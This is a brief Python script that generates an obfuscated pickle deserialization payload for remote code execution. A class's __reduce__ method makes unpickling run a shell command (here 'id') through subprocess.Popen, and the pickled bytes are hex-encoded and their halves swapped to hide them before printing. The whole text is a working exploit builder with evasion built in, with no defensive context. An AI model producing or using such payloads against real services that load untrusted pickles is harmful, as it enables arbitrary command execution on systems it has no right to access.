import pickle

class PickleRce(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (('/bin/sh', '-c', 'id'), 0))

obfuscate1 = pickle.dumps(PickleRce())
obfuscate2 = obfuscate1.hex()
obfuscate3 = obfuscate2[len(obfuscate2)//2:] + obfuscate2[:len(obfuscate2)//2]

print(f"Payload: {obfuscate3}")
